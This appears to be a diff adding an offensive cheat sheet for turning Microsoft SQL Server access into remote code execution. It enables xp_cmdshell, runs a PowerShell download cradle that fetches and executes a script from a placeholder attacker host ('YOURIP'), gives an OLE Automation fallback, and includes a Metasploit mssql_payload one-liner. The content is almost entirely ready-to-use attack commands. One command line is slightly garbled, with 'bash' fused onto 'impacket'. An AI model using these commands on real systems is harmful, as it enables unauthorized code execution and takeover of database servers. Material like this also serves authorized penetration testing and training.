@@ -1,0 +1,15 @@
+MSSQL → RCE
+bashimpacket-mssqlclient user:pass@target -windows-auth
+
+# Inside shell:
+SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+SQL> xp_cmdshell 'whoami'
+SQL> xp_cmdshell 'powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString(\"http://YOURIP/shell.ps1\")"'
+
+# If xp_cmdshell disabled and can't enable
+SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+SQL> DECLARE @shell INT; EXEC sp_oacreate 'wscript.shell', @shell OUTPUT; EXEC sp_oamethod @shell, 'run', NULL, 'cmd /c whoami'
+
+# Direct via metasploit
+msfconsole -q -x "use exploit/windows/mssql/mssql_payload; set RHOSTS target; set USERNAME sa; set PASSWORD pass; run"
